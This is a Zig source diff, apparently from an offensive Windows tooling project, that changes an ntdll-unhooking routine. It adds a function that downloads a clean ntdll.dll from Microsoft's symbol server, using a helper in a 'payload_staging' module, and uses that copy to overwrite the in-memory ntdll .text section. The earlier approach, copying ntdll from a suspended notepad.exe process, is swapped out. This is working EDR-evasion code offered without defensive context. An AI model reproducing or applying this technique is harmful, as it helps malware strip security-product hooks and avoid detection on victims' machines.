@@ -3,6 +3,7 @@ const win = @import("zigwin32").everything;
 const windows = @import("win.zig");
 const common = @import("common.zig");
 const process = @import("process.zig");
+const web_server = @import("payload_staging/web_server.zig");
 
 const IMAGE_FILE_HEADER = win.IMAGE_FILE_HEADER;
 const IMAGE_SECTION_HEADER = win.IMAGE_SECTION_HEADER;
@@ -86,7 +87,7 @@ pub fn replaceNtdllTextSection(allocator: std.mem.Allocator) !void {
         return error.NtProtectVirtualMemoryFailed;
     }
 
-    const unhooked_ntdll = try readNtdllFromASuspendedProcess(allocator, "notepad.exe");
+    const unhooked_ntdll = try readNtdllFromServer(allocator);
     defer allocator.free(unhooked_ntdll);
 
     const unhooked_ntdll_text = try getNtdllText1(unhooked_ntdll.ptr);
@@ -166,7 +167,11 @@ pub fn readNtdllFromASuspendedProcess(allocator: std.mem.Allocator, process_name
     }
 
     const ntdll_module = try windows.getModuleHandleReplacement(allocator, "ntdll.dll") orelse return error.FailedToGetNtdll;
-    const ntdll_len = getNtdllSize(@ptrCast(ntdll_module)) orelse return error.FailedToGetNtdllSize;
+    const nt_headers = windows.getNtHeaders(@ptrCast(ntdll_module)) orelse return null;
+    const ntdll_len = switch (nt_headers) {
+        .nt_headers_32 => |nt_headers_32| nt_headers_32.OptionalHeader.SizeOfImage,
+        .nt_headers_64 => |nt_headers_64| nt_headers_64.OptionalHeader.SizeOfImage,
+    };
 
     const ntdll_buf = try allocator.alloc(u8, ntdll_len);
 
@@ -179,6 +184,31 @@ pub fn readNtdllFromASuspendedProcess(allocator: std.mem.Allocator, process_name
 
     _ = DebugActiveProcessStop(process_info.process_id);
     _ = TerminateProcess(process_info.h_process, 0);
+
+    return ntdll_buf;
+}
+
+pub fn readNtdllFromServer(allocator: std.mem.Allocator) ![]u8 {
+    const ntdll_module = try windows.getModuleHandleReplacement(allocator, "ntdll.dll") orelse return error.FailedToGetNtdll;
+    const nt_headers = windows.getNtHeaders(@ptrCast(ntdll_module)) orelse return error.FailedToGetNtHeaders;
+
+    var size_of_image: u32 = 0;
+    var time_date_stamp: u32 = 0;
+    switch (nt_headers) {
+        .nt_headers_64 => |nt_headers_64| {
+            size_of_image = nt_headers_64.OptionalHeader.SizeOfImage;
+            time_date_stamp = nt_headers_64.FileHeader.TimeDateStamp;
+        },
+        .nt_headers_32 => |nt_headers_32| {
+            size_of_image = nt_headers_32.OptionalHeader.SizeOfImage;
+            time_date_stamp = nt_headers_32.FileHeader.TimeDateStamp;
+        },
+    }
+
+    const url = try std.fmt.allocPrintZ(allocator, "https://msdl.microsoft.com/download/symbols/ntdll.dll/{X}{x}/ntdll.dll", .{ time_date_stamp, size_of_image });
+    defer allocator.free(url);
+
+    const ntdll_buf = try web_server.getPayloadFromUrl(allocator, url);
 
     return ntdll_buf;
 }
@@ -277,14 +307,6 @@ pub fn mapNtdllFromKnownDlls() ![*]u8 {
     };
 
     return @ptrCast(ntdll_buf);
-}
-
-fn getNtdllSize(ntdll_base_address: [*]const u8) ?u32 {
-    const nt_headers = windows.getNtHeaders(ntdll_base_address) orelse return null;
-    return switch (nt_headers) {
-        .nt_headers_32 => |nt_headers_32| nt_headers_32.OptionalHeader.SizeOfImage,
-        .nt_headers_64 => |nt_headers_64| nt_headers_64.OptionalHeader.SizeOfImage,
-    };
 }
 
 fn getNtdllText1(ntdll_base_address: [*]u8) ![]u8 {
